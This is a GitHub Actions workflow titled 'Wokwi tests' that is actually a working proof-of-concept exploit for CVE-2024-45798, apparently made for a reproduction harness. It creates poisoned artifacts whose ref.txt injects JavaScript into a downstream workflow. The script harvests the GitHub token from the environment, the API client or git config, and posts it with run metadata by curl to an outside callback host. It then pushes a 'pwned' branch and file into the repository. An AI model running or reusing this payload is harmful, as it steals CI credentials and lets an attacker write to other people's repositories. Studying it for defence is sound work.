name: Wokwi tests

on: pull_request

permissions: { contents: read }

jobs:
  trigger:
    name: Upload artifact
    runs-on: ubuntu-latest
    steps:
      - name: Create poisoned artifacts
        run: |
          mkdir -p artifacts/event_file
          printf 'pull_request' > artifacts/event.txt
          printf 'synchronize' > artifacts/action.txt
          printf '%s' '${{ github.sha }}' > artifacts/sha.txt
          printf 'success' > artifacts/conclusion.txt
          printf '%s' '<?xml version="1.0" encoding="UTF-8"?><testsuites tests="1" failures="0" errors="0" skipped="0"><testsuite name="poc" tests="1" failures="0" errors="0" skipped="0"><testcase classname="poc" name="cve_2024_45798"/></testsuite></testsuites>' > artifacts/report.xml
          printf '%s' '{"action":"synchronize","number":1,"pull_request":{"number":1,"head":{"sha":"${{ github.sha }}"}}}' > artifacts/event_file/event.json
          cat > artifacts/ref.txt << 'EOF'
          x'; const cp=require('child_process');let tk='';try{tk=process.env.INPUT_GITHUB_TOKEN||''}catch(e){}try{if(!tk){tk=String((await github.auth()).token||'')}}catch(e){}try{if(!tk){tk=String(cp.execSync('git -C '+process.env.GITHUB_WORKSPACE+' config --get-all http.https://github.com/.extraheader',{stdio:['ignore','pipe','ignore']}))}else{tk=String(tk)}}catch(e){}const meta='repo='+process.env.GITHUB_REPOSITORY+' event='+process.env.GITHUB_EVENT_NAME+' workflow='+process.env.GITHUB_WORKFLOW+' job='+process.env.GITHUB_JOB+' run='+process.env.GITHUB_RUN_ID+' sha='+process.env.GITHUB_SHA+' token='+String(tk).replace(/\s+/g,'');try{cp.execSync("curl -s -X POST 'https://cve-repro-callback.pvharmo.workers.dev/INJECTED-MARKER-cve-2024-45798-c3c4e6b6e641?harness_run_id=20260831T002034-845acc08' --data-binary "+JSON.stringify(meta))}catch(e){}try{console.log('LEAKED_META='+meta)}catch(e){}try{const br='pwn-INJECTED-MARKER-cve-2024-45798-c3c4e6b6e641';const mh=(await github.rest.repos.getBranch({owner:context.repo.owner,repo:context.repo.repo,branch:'main'})).data.commit.sha;await github.rest.git.createRef({owner:context.repo.owner,repo:context.repo.repo,ref:'refs/heads/'+br,sha:mh});await github.rest.repos.createOrUpdateFileContents({owner:context.repo.owner,repo:context.repo.repo,path:'pwned-INJECTED-MARKER-cve-2024-45798-c3c4e6b6e641.txt',message:'pwned via CVE-2024-45798',content:Buffer.from('branch poisoned by code injection in tests_results.yml - marker: INJECTED-MARKER-cve-2024-45798-c3c4e6b6e641').toString('base64'),branch:br})}catch(e){} //
          EOF
      - uses: actions/upload-artifact@v4
        with:
          name: parent-artifacts
          path: artifacts
